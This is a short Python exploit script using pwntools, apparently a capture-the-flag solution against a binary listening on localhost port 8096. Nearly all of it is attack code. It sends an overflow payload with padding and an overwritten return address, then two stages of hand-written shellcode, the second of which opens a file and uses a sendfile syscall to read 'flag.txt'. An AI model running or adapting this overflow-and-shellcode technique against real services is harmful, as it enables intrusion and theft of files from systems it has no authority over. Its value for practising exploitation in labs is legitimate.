#!/usr/bin/env python3



from pwn import *
from time import sleep

context.arch = "amd64"
e = ELF("../a.out")
r = remote("127.0.0.1",8096)
shellcode = asm("""
        mov rdi,rdx
        mov dl,0xff
        syscall""")
shellcode2 = asm("""
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        mov rax,0
        mov rdi,4
        mov rsi,0x404100
        mov rdx,8
        syscall
        mov rbx,rsi
        mov rax,5
        mov rcx,0
        mov rdx,0
        int 0x80
        mov rdi,0x4
        mov rsi,rax
        mov rdx,0
        mov r10,100
        mov rax,40
        syscall
        """)
value = b"done\x00\x00\x00\x00" + b"A" * 32 + p64(0x40185d) + shellcode
r.send(value)
r.interactive()
exploit = b"/bin/sh\x00" + b"\x00" * 32 + p64(0x40185d) + shellcode2
r.send(exploit)
r.interactive()
r.send(b"flag.txt")
r.interactive()
